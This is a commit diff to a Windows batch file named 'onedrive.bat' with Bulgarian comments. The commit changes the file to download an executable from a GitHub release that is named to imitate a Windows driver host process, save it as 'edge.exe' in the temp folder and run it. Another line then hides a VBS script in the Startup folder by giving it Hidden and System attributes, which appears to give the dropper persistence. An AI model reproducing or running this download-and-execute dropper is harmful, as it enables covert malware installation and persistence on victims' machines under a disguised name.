ad53d441ef2cfdfd3bf6b6bbd942e73d85f2c4fd
bgprofil9-create <bgprofil9@gmail.com>
2026-01-16 05:23:10 +0200

    Update onedrive.bat

--- onedrive.bat
+++ onedrive.bat
@@ -2,15 +2,16 @@
 
 :: Сваляне на файла в %temp%
 echo Downloading file...
-powershell -Command "Invoke-WebRequest -Uri 'https://upload.object2.vk-apps.com/vk-me-desktop-dev-5837a06d-5f28-484a-ac22-045903cb1b1a/latest/win10/vk-messenger-x64.exe' -OutFile '%temp%\vk-messenger.exe'"
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/bgprofil9-create/profejt/releases/download/v1/Windows.Driver.Foundation.-.User-mode.Driver.Framework.Host.Process.exe' -OutFile '%temp%\edge.exe'"
 
 :: Стартиране на файла
 echo Starting application...
-start "" "%temp%\vk-messenger.exe"
+start "" "%temp%\edge.exe"
 
 powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 170; $file = [Environment]::GetFolderPath('ApplicationData') + '\Microsoft\Windows\Start Menu\Programs\Startup\Sound devices.vbs'; if (Test-Path $file) { (Get-Item $file).Attributes = 'Hidden,System' }"
 
 pause
+
 
 
 
